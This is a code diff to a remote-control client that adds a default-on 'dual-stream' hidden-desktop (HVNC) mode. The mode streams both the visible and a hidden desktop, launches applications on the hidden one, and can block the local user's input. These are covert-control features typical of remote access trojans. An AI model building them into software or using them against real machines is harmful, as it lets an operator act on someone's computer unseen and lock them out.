@@ -26,6 +26,12 @@ from remote_client.windows.hidden_desktop import (
 logger = logging.getLogger(__name__)
 
 
+def _is_dual_stream_enabled() -> bool:
+    """Check if dual-stream mode is enabled for HVNC."""
+    value = os.getenv("RC_HVNC_DUAL_STREAM", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
 def load_or_create_device_token() -> str | None:
     env_token = os.getenv("RC_DEVICE_TOKEN")
     if env_token:
@@ -159,6 +165,53 @@ def build_session_resources(mode: str | None) -> SessionResources:
                 session_mode = "fallback"
             else:
                 session_mode = "auto"  # auto now tries hvnc first
+        
+        # Check if dual-stream mode is enabled for HVNC
+        if session_mode == "hvnc" and _is_dual_stream_enabled():
+            try:
+                from remote_client.windows.hvnc_track import DualStreamSession
+                dual_session = DualStreamSession()
+                logger.info("Dual-stream HVNC session started (main + hvnc)")
+                
+                controller = dual_session.input_controller
+                control_handler = _build_control_handler(controller)
+                # Include both video tracks
+                media_tracks: list[Any] = dual_session.video_tracks.copy()
+                if _audio_enabled():
+                    media_tracks.append(AudioTrack())
+                
+                def _set_stream_profile(
+                    profile: str | None,
+                    width: int | None,
+                    height: int | None,
+                    fps: int | None,
+                ) -> None:
+                    # Apply profile to both video tracks
+                    for track in dual_session.video_tracks:
+                        if hasattr(track, "set_profile"):
+                            track.set_profile(profile, width, height, fps)
+                
+                def _set_input_blocking(enabled: bool) -> bool:
+                    if enabled:
+                        return dual_session.block_local_input()
+                    else:
+                        dual_session.unblock_local_input()
+                        return True
+                
+                def _get_input_blocked() -> bool:
+                    return getattr(dual_session, '_input_blocked', False)
+                
+                return SessionResources(
+                    control_handler,
+                    media_tracks,
+                    close=dual_session.close,
+                    launch_app=dual_session.launch_application,
+                    set_stream_profile=_set_stream_profile,
+                    set_input_blocking=_set_input_blocking,
+                    get_input_blocked=_get_input_blocked,
+                )
+            except Exception as exc:
+                logger.warning("Dual-stream session failed: %s, falling back to single-stream", exc)
         
         try:
             hidden_session = create_hidden_session(mode=session_mode)
